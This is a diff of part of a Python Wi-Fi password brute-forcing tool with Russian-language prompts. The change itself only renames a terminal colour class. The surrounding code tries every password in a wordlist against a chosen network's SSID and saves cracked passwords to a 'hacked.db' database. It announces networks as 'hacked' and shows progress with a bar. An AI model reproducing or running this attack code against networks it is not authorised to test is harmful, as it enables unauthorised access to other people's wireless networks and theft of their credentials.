@@ -1,6 +1,6 @@
 import sqlite3, os
 from pywifi import Profile, const
-from libs.TFormat import tcolors
+from libs.termFormat import TColors
 from libs.func import clear, checkfiles
 from time import sleep
 from tqdm import trange
@@ -35,18 +35,18 @@ def brutforce(iface, ssid):
     usr_sel = None
     if cursor.fetchone() != None:
         while True:
-            usr_sel = input(tcolors.USER + '[*] Выбранная сеть уже взломана.\
+            usr_sel = input(TColors.USER + '[*] Выбранная сеть уже взломана.\
                     \n[Y] Для повторного подбора, [N] Для выхода: '\
-                    + tcolors.END)
+                    + TColors.END)
             if usr_sel.upper() == ('Y' or '[Y]'):
                 break
             elif usr_sel.upper() == ('N' or '[N]'):
-                print(tcolors.SUCCESS + '\n[+] Проверьте базу данных files\hacked.db' + tcolors.END)
+                print(TColors.SUCCESS + '\n[+] Проверьте базу данных files\hacked.db' + TColors.END)
                 connection.close()
                 return 0
             else:
-                print(tcolors.ERROR + '[-] Введено неверное значение. Попробуйте еще раз'\
-                      + tcolors.END)
+                print(TColors.ERROR + '[-] Введено неверное значение. Попробуйте еще раз'\
+                      + TColors.END)
                 continue
     # ----------------------------------------------
     
@@ -54,16 +54,16 @@ def brutforce(iface, ssid):
     if os.stat("files\\words.txt").st_size != 0:
         passwords = open('files\\words.txt', 'r')
     else:
-        print(tcolors.ERROR + "[-] Словарь паролей (files\words.txt) пуст" + tcolors.END)
+        print(TColors.ERROR + "[-] Словарь паролей (files\words.txt) пуст" + TColors.END)
         sleep(5)
         return 0
         
     l = len(passwords.readlines())
     passwords.seek(0)
     count = 0
-    print(tcolors.PROC)
+    print(TColors.PROC)
     with trange(l, dynamic_ncols=True, desc=(f"[~] Попытка взлома {ssid}..."),\
-                bar_format=(tcolors.PROC + '{l_bar}{bar}{r_bar}'), unit='pwd') as bar:
+                bar_format=(TColors.PROC + '{l_bar}{bar}{r_bar}'), unit='pwd') as bar:
         for pwd in passwords:
             if victim(iface, ssid, pwd.rstrip()) == True:
                 bar.update(l - count)
@@ -82,9 +82,9 @@ def brutforce(iface, ssid):
                     cursor.execute('UPDATE Networks SET password = ? WHERE ssid = ?',\
                                    (pwd.rstrip(), ssid))
                     connection.commit()
-                print(tcolors.SUCCESS +\
+                print(TColors.SUCCESS +\
                       f"[+] Успешное подключение!\nПароль: {pwd.rstrip()}\
-                      \n\n[+] Данные записаны в files\hacked.db" + tcolors.END)
+                      \n\n[+] Данные записаны в files\hacked.db" + TColors.END)
                 connection.close()
                 return 1
             else:
@@ -93,4 +93,4 @@ def brutforce(iface, ssid):
 
     clear()
     connection.close()
-    print(tcolors.ERROR + "[-] Не удалось подобрать пароль :(" + tcolors.END)
+    print(TColors.ERROR + "[-] Не удалось подобрать пароль :(" + TColors.END)
